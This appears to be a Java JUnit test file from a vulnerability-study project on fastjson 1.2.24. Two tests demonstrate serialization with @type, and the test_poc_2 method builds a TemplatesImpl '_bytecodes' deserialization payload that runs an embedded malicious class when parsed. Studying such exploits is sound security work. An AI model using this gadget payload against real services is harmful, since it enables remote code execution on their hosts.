package com.myapp;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.serializer.SerializerFeature;
import org.apache.tomcat.util.codec.binary.Base64;
import org.apache.tomcat.util.http.fileupload.IOUtils;
import org.junit.Test;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.util.HashMap;

public class test1 {
    @Test
    public void test1() {
        Student student = new Student();
//        student.setName("lAdyb1rd");
        student.setAge(6);
        HashMap<String, String> map = new HashMap<String, String>();
        map.put("k1", "val1");
        student.setProperties(map);

        System.out.println("----------序列化------------");
        //SerializerFeature.WriteClassName，是JSON.toJSONString()中的一个设置属性值，
        // 设置之后在序列化的时候会多写入一个@type，即写上被序列化的类名
        String jsonStr = JSON.toJSONString(student, SerializerFeature.WriteClassName);
        System.out.println("jsonStr=" + jsonStr);



    }

    @Test
    public void test2() {
        String jsonStr =  "{\"@type\":\"com.myapp.Student\",\"age\":6,\"name\":\"lAdyb1rd\",\"_properties\":{\"k1\":\"val1\"}}";
        System.out.println("jsonStr=" + jsonStr);
        System.out.println("----------反序列化: JSON.parse------------");
        Student stu2 = (Student) JSON.parse(jsonStr);
        System.out.println(stu2);
    }

    private String readClass(String cls){
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        try {
            IOUtils.copy(new FileInputStream(new File(cls)), bos);
        } catch (Exception e) {
            e.printStackTrace();
        }

        return Base64.encodeBase64String(bos.toByteArray());
    }

    @Test
    public void test_poc_2() {
        String evilClassPath = "/Users/work/vuln-study/vulhubWork/JavaVul/fastjson-1.2.24/target/classes/com/myapp/Exploit2.class";
        String evilCode = readClass(evilClassPath);
        String NASTY_CLASS = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
        String fj_poc = "{\"@type\":\"" + NASTY_CLASS +
                "\",\"_bytecodes\":[\""+evilCode+"\"],'_name':'a.b','_tfactory':{},\"_outputProperties\":{}}\n";
        System.out.println(fj_poc);

//        JSON.parse(fj_poc, Feature.SupportNonPublicField);
        JSON.parseObject(fj_poc, Feature.SupportNonPublicField);
    }

}
